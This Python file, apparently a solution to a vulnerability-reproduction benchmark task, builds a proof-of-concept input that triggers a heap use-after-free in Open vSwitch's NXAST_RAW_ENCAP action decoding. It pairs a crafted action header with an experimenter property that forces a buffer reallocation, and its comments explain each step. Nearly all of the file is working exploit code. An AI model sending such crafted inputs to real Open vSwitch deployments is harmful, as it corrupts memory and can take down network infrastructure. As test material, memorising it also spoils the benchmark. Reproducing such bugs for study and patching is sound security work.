import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a Heap Use-After-Free in the decoding of
        # NXAST_RAW_ENCAP actions in Open vSwitch. The function
        # `decode_NXAST_RAW_ENCAP` gets a pointer `encap` to a structure
        # within an output buffer `out`. It then calls property parsers. If a
        # property parser causes the `out` buffer to be reallocated, the `encap`
        # pointer becomes stale. The function then writes to this stale pointer.
        #
        # To trigger this, we construct an NXAST_RAW_ENCAP action containing an
        # experimenter property that, when decoded, writes enough data to the `out`
        # buffer to force a reallocation. The decoder for
        # `NXT_BUNDLE_ADD_MSG_PROP_DATA` serves this purpose perfectly.

        poc_len = 72
        prop_len = 48
        
        # Part 1: nx_action_encap header (24 bytes)
        # This structure precedes the properties within the action.
        OFPAT_EXPERIMENTER = 0xffff
        NX_VENDOR_ID = 0x00002320
        NXAST_RAW_ENCAP = 26

        # The C struct `nx_action_encap` is 24 bytes on the wire due to padding.
        # We pack its fields and add trailing padding to match.
        # Fields layout: type(2), len(2), vendor(4), subtype(2),
        # version(1), flags(1), proto(1), pad(5). This totals 18 bytes.
        # The remaining 6 bytes are padding.
        nae_header_format = '!HHIHBBB5s'
        nae_header_packed_size = struct.calcsize(nae_header_format)
        
        nae_header = struct.pack(
            nae_header_format,
            OFPAT_EXPERIMENTER,
            poc_len,
            NX_VENDOR_ID,
            NXAST_RAW_ENCAP,
            0,  # ofp_version
            0,  # flags
            0,  # proto
            b'\x00' * 5
        )
        nae_header += b'\x00' * (24 - nae_header_packed_size)

        # Part 2: Malicious Property (48 bytes)
        # This is an ofp_prop_experimenter property that will be decoded by
        # `decode_bundle_add_msg_prop_data`. Its payload will be copied
        # to the output buffer, triggering the reallocation.
        # Header size: 12 bytes. Data size: 48 - 12 = 36 bytes.
        OFPTMPT_EXPERIMENTER = 0xffff
        NXT_BUNDLE_ADD_MSG_PROP_DATA = 1
        prop_data_len = prop_len - 12

        prop = struct.pack(
            '!HHII',
            OFPTMPT_EXPERIMENTER,
            prop_len,
            NX_VENDOR_ID,
            NXT_BUNDLE_ADD_MSG_PROP_DATA
        )
        prop += b'\x41' * prop_data_len

        # The final PoC is the combination of the action header and the property.
        poc = nae_header + prop
        return poc